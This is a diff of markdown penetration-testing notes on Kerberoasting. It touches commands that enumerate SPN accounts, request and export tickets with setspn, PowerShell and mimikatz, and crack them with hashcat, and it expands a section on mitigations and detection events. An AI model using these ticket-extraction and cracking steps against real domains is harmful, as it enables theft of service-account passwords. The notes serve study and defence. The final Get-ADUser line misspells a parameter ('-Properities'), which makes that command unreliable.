@@ -38,14 +38,6 @@ LDAP filter to return user accounts that have SPNs
 &(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
 ```
 
-> [!Important]
-> 
-> Decrypting TGS-REP Tickets with `hashcat` :
-> 
-> - `$krb5tgs$23$*` -> RC4 (type 23) encrypted ticket -> `-m 13100`
-> - `$krb5tgs$18$*` -> AES-256 (type 18) encrypted ticket -> `-m 19700`
-> - `$krb5tgs$17$*` -> AES-128 (type 17) encrypted ticket -> `-m 19600`
-
 ##### Cracking TGS
 
 ``` Bash
@@ -64,6 +56,14 @@ $ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' john_sqldev_tgs > 
 # Crack it with hashcat
 $ hashcat -m 13100 hashcat_sqldev_tgs /usr/share/wordlists/rockyou.txt 
 ```
+
+> [!Important]
+> 
+> Decrypting TGS-REP Tickets with `hashcat` :
+> 
+> - `$krb5tgs$23$*` -> RC4 (type 23) encrypted ticket -> `-m 13100`
+> - `$krb5tgs$18$*` -> AES-256 (type 18) encrypted ticket -> `-m 19700`
+> - `$krb5tgs$17$*` -> AES-128 (type 17) encrypted ticket -> `-m 19600`
 
 ---
 ### From Linux
@@ -134,7 +134,7 @@ PS C:\Tools> Get-DomainUser -SPN
 # Check the supported ecryption type attribute
 # msDS-SupportedEncryptionTypes = (0) / (0x0)  -> defaults to RC4_HMAC_MD5
 # msDS-SupportedEncryptionTypes = (24)/ (0x18) -> AES 128, AES 256
-PS C:\> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes 
+PS C:\> Get-DomainUser <USERNAME> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes 
 ```
 
 Check [Supported Kerberos Encryption Types](https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/decrypting-the-selection-of-supported-kerberos-encryption-types/1628797) for more knowledge about the `msDS-SupportedEncryptionTypes` attribute and what it's refer to.
@@ -152,7 +152,7 @@ PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -A
 PS C:\> Add-Type -AssemblyName System.IdentityModel
 PS C:\> setspn.exe -T DOMAIN.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() } 
 
-# Extract the tickets that we load into the memory from above commands with mimikatz.exe
+# Extract the tickets that we loaded into the memory from above commands with mimikatz.exe
 mimikatz # base64 /out:true
 mimikatz # kerberos::list /export 
 # The output will be the Base64 blop of the kirbi files
@@ -221,20 +221,36 @@ PS C:\Tools> Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.
 ---
 ### Mitigations and Detections
 
-Edit the encryption types used by Kerberos
+- Using long and complex passwords for your service accounts is critical to make cracking exponentially harder.
+-  Use [MSA](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [gMSA](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.
+- Limiting the privileges of service accounts. ( ex: not placing service accounts in domain administrators )
+- Rotate the KRBTGT service account password at least every 180 days. This action can invalidate any previous tickets acquired and in use by attackers.
+- Edit the encryption types used by Kerberos to only enable strong algorithms: 
+
 `Open Group Policy > Edit the defautl domain policy > Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options > double-click on (Network security: Configure encryption types allowed for Kerberos) `
 
 <img src="/assets/kerb_encrypt_types.png" style="height:60%px;width:60%">
 
 > Removing support for AES would introduce a security flaw into AD and should likely never be done.
-> Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
 > 
-> An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.
+> Removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.
+> 
+> Kerberoasting while degrading the encryption algorithm to RC4 will request Kerberos TGS tickets, which should not be the majority of Kerberos activity within a domain. Kerberoasting attack will generate abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools. 
 
-Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.
+- Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy. Which will generate:
+	- Event ID: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769) A Kerberos service ticket was requested.
+	- Event ID: [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770) A Kerberos service ticket was renewed. 
 
 <img src="/assets/kerb_audit.png" style="height:60%px;width:60%">
 
-Doing so will generate two separate event IDs: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.
+> 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.
 
-[Some mitigation and detection strategies for Kerberoasting](https://adsecurity.org/?p=3458).
+- [Some mitigation and detection strategies for Kerberoasting from adsecurity](https://adsecurity.org/?p=3458).
+- Look at the fix [HERE](https://web.archive.org/web/20241125112424/https://www.stigviewer.com/stig/windows_server_2016/2019-03-13/finding/V-91779) to reset the password regularly or do it from `Active Directory Users and Computers`.
+
+For resetting a password, ten hours must elapse between the first and second reset. Two resets are required to invalidate the previous Kerberos password and to stop potential malicious use. Ensure you force replication between the resets. We can also use [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1) from Microsoft to reset the `krbtgt` account password while minimizing the likelihood of Kerberos authentication issues being caused by the operation".
+
+```PowerShell
+# To check when the password was last set
+Get-ADUser krbtgt -Properities SamAccountName,PasswordLastSet
+```
